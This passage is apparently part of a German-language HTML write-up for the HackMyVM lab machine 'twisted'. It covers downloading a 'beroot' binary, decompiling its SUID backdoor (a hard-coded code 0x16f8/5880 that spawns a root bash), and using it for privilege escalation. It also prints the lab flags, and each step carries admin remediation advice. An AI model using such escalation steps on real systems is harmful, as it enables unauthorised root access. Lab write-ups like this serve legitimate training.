+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysiere die heruntergeladene `beroot`-Datei mit einem Reverse-Engineering-Tool (Ghidra, IDA Pro, `strings`, `radare2` etc.), um herauszufinden, wie sie zur Privilegieneskalation genutzt werden kann.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung zu Egress Filtering.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://twisted.hmv:8000/beroot</span></div>
+                    <pre>
+--2022-10-09 01:07:31--  http://twisted.hmv:8000/beroot
+Auflösen des Hostnamens twisted.hmv (twisted.hmv)… 192.168.2.125
+Verbindungsaufbau zu twisted.hmv (twisted.hmv)|192.168.2.125|:8000 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 16864 (16K) [application/octet-stream]
+Wird in beroot gespeichert.
+
+beroot                        100%[===================>]  16,47K  --.-KB/s    in 0s
+
+2022-10-09 01:07:31 (405 MB/s) - beroot gespeichert [16864/16864]
+                    </pre>
+                    <!-- Python Server Log vom Zielsystem (wird nach dem wget angezeigt) -->
+                    <pre>
+192.168.2.140 - - [09/Oct/2022 01:07:31] "GET /beroot HTTP/1.1" 200 -
+                    </pre> <!-- Datum im Log angepasst -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird versucht, die heruntergeladene Datei `beroot` mit `gidra` (Tippfehler) und dann `ghidra` zu öffnen. Beide Befehle scheitern, da Ghidra offenbar nicht installiert ist. Anschließend wird `apt install ghidra` ausgeführt, um Ghidra zu installieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies zeigt den Prozess der Vorbereitung zur Analyse der Datei. Ghidra ist ein leistungsfähiges, kostenloses Reverse-Engineering-Tool von der NSA.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nach der Installation von Ghidra, lade die `beroot`-Datei und analysiere die `main`-Funktion oder andere relevante Teile des Codes, um die Logik für die Privilegieneskalation zu verstehen.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gidra beroot</span></div>
+                     <pre>
+Command 'gidra' not found, did you mean:
+  command 'ghidra' from deb ghidra
+Try: apt install <deb name>
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ghidra</span></div>
+                      <pre>
+Command 'ghidra' not found, but can be installed with:
+apt install ghidra
+                      </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">apt install ghidra</span></div>
+                      <!-- Ausgabe der Installation -->
+                      <pre>
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+... (Paketinstallation läuft) ...
+Setting up ghidra (x.y.z) ...
+                      </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der `user.txt`-Datei wird auf dem Zielsystem als `bonita` gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag ist `<span class="password">HMVblackcat</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag notiert. Fokussiere dich auf die Analyse von `beroot` und die Eskalation zu Root.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+bonita@twisted:~$ cat user.txt
+<span class="password">HMVblackcat</span>
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `/root/root.txt` wird angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag ist `<span class="password">HMVwhereismycat</span>`. (Hinweis: Der Prompt im Originaltext ist `markus@twisted:~$`, was nicht stimmen kann, da `markus` keinen Zugriff auf `/root/root.txt` haben sollte. Der Befehl muss als `root` ausgeführt worden sein, wie später im POC gezeigt wird).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Flag notiert. Damit sind beide Flags gefunden.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Korrekter Prompt wäre root@twisted:~# -->
+                     <pre>
+root@twisted:~# tail -n 100 /root/root.txt <!-- Oder cat -->
+<span class="password">HMVwhereismycat</span>
+                     </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt zeigt einen Ausschnitt des C-Codes der `main`-Funktion aus dem `beroot`-Binary, der vermutlich durch die Analyse mit Ghidra gewonnen wurde. Der Code fragt nach einer Zahl (`local_c`), vergleicht sie mit dem hexadezimalen Wert `0x16f8` und führt bei Übereinstimmung `setuid(0)`, `setgid(0)` und `system("/bin/bash")` aus. Andernfalls gibt er "WRONG" aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Code enthüllt den Mechanismus zur Privilegieneskalation: Wenn der korrekte Code (Integer-Wert von `0x16f8`) eingegeben wird, setzt das Programm seine effektive Benutzer- und Gruppen-ID auf 0 (root) und startet eine Bash-Shell. Dies funktioniert, weil das Programm SUID/SGID-Rechte hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konvertiere den Hex-Wert `0x16f8` in eine Dezimalzahl. Führe dann auf dem Zielsystem als `bonita` den Befehl `./beroot` aus und gib die berechnete Dezimalzahl ein, um eine Root-Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> Entferne das unsichere SUID/SGID-Binary `beroot` oder korrigiere den Code, um die Sicherheitslücke zu schließen. Programme, die Root-Rechte erlangen können, dürfen niemals einfache, feste Codes oder Passwörter zur Authentifizierung verwenden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Terminal-Befehl, sondern Code-Analyse -->
+                     <pre>
+undefined8 main(void)
+
+{
+  int local_c;
+
+  printf("Enter the code:\n ");
+  scanf("%i",&local_c); // & wurde zu & maskiert
+  if (local_c == 0x16f8) { // Vergleich mit Hex-Wert
+    setuid(0); // Setze User ID auf 0 (root)
+    setgid(0); // Setze Group ID auf 0 (root)
+    system("/bin/bash"); // Starte Root-Shell
+  }
+  else {
+    puts("\nWRONG");
+  }
+  return 0;
+}
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Hexadezimalwert `0x16f8` wird (vermutlich mit einem Online-Tool oder `python`/`bash`) in den Dezimalwert `5880` umgerechnet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der korrekte Code für das `beroot`-Programm wurde ermittelt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende die Zahl `5880` bei der Ausführung von `./beroot`.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Terminal-Befehl, sondern Notiz/Ergebnis -->
+                     <pre>
+convertiere 0x16f8
+https://calculator.name/baseconvert/hexadecimal/decimal/16F8
+result: 5880
+ich muss diesen wert in die beroot abfrage eingeben damit
+ich root werde....
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- POC beginnt hier -->
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `bonita` wird das SUID/SGID-Programm `./beroot` im Home-Verzeichnis ausgeführt. Auf die Aufforderung "Enter the code:" wird der zuvor berechnete Dezimalwert `5880` eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Da der eingegebene Code `5880` dem Hex-Wert `0x16f8` entspricht, führt das Programm `setuid(0)`, `setgid(0)` und `system("/bin/bash")` aus. Der Prompt wechselt sofort zu `root@twisted:~#`, was bestätigt, dass eine Root-Shell erlangt wurde.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Ziel ist erreicht. Die Root-Flag wurde bereits zuvor gelesen (wenn auch mit falschem Prompt im Originaltext). Der Angriffspfad ist vollständig dokumentiert.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne das `beroot`-Binary. Untersuche, wie dieses Binary auf das System gelangt ist und wer die SUID/SGID-Berechtigungen gesetzt hat. Bereinige das System von allen Spuren des Angriffs.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+bonita@twisted:~$ ./beroot
+Enter the code:
+ <span class="command">5880</span>
+root@twisted:~#
+                     </pre> <!-- Root-Prompt hinzugefügt -->
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">root@twisted:~# cat /root/root.txt</div> <!-- Korrekter Prompt -->
+                     <div class="flag-value"><span class="password">HMVwhereismycat</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">bonita@twisted:~$ cat user.txt</div>
+                     <div class="flag-value"><span class="password">HMVblackcat</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus wget-Zeitstempel extrahiert -->
+        <p>Berichtsdatum: 9. Oktober 2022</p>
+    </footer>
+</body>
+</html>
